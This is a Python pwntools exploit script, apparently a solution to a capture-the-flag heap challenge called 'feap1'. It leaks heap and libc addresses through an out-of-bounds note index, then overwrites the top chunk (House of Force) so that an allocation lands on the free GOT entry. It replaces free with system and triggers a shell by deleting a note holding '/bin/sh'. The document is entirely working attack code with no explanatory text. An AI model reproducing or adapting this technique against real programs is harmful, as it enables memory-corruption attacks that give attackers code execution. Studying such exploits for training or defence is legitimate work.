from pwn import *
p = process('./feap1', env = {"LD_PRELOAD":"./libc.so.6"})

def create(size,title,body):
    p.sendlineafter('> ','1')
    p.sendlineafter('Enter note body size: ',str(size))
    p.sendlineafter('Please Enter note title (MAX 63):',title)
    p.sendlineafter(': ',body)

def delete(idd):
    p.sendlineafter('> ','2')
    p.sendlineafter('Please enter note id to delete: ',str(idd))

def edit(idd,bt,body):
    p.sendlineafter('> ','3')
    p.sendlineafter('Please enter note id to edit: ',str(idd))
    p.sendlineafter('1 for edit title, 2 for edit body: ',str(bt))
    if(bt == 1):
        p.sendlineafter('Please enter note title: ',body)
    else:
        p.sendlineafter('Please enter note body: ',body)

def notes():
    p.sendlineafter('> ','4')

def printnote(idd):
    p.sendlineafter('> ','5')
    p.sendlineafter('Please enter note id to print: ',str(idd))

free_got = 0x602018
create('45','geethna',p64(0x00000000006020a8))
printnote(566)
p.recvuntil('Title: ')
heap_leak = u64(p.recvline().strip() + "\x00"*4)
delete(0)
create('45','/bin/sh\x00',p64(0x0000000000602020))
printnote(566)
p.recvuntil('Title: ')
libc_leak = u64(p.recvline().strip() + "\x00"*2)
print hex(heap_leak)
libc_main = libc_leak - 0x6f690
print hex(libc_main)
system = libc_main + 0x45390
puts = libc_main + 0x6f690
prev = heap_leak + 4528
top_chunk = prev + 48
size = free_got - top_chunk - 0x60
#size = free_got - heap_leak - 620
print hex(size)
edit(0,2,"a"*48 + "b"*8 + "\xff"*8)
#create(-6299754,'geethna','some')
create(size,'','')
one = libc_main + 0xf1147
create(16,"a"*8 + p64(system) + p64(puts),'asdbh')
gdb.attach(p)
delete(0)
p.interactive()
